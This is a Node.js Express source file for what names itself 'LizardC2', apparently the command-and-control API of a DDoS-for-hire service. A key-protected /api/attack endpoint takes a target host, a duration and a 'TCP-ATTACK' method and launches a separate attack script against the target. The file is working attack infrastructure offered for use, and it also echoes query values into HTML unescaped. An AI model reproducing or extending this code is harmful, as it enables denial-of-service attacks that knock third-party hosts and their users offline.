const express = require('express');

const app = express();
const port = 8080;

const key = "@lizardpredator";

app.get('/api/attack', (req, res) => {
  try {
    const keyFromQuery = req.query.key;
    const host = req.query.host;
    const time = parseInt(req.query.time, 10);
    const method = req.query.method;

    if (keyFromQuery !== key) {
      return res.status(401).send('Key not working');
    }

    if (!host || isNaN(time) || method !== 'TCP-ATTACK') {
      return res.status(400).send('Invalid parameters or method');
    }

    // Only handle the TCP-ATTACK method
    if (method === 'TCP-ATTACK') {
      const spawn = require('child_process').spawn;
      const args = [host, time, '1', '1']; // Updated arguments

      const child = spawn('node', ['tcp-attack.js', ...args]);

      child.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      child.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      child.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) {
          const html = `
            <html>
              <body>
                <h1>Lizard Api</h1>
                <p>Host: ${host}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          res.status(500).send('An error occurred during process execution');
        }
      });

      child.on('error', (err) => {
        console.error('Failed to start subprocess:', err);
        res.status(500).send('Failed to start subprocess');
      });
    }
  } catch (error) {
    console.error(error);
    res.status(500).send('There was a problem.');
  }
});

app.listen(port, () => {
  console.log(`API LizardC2 Started To: ${port} port`);
});
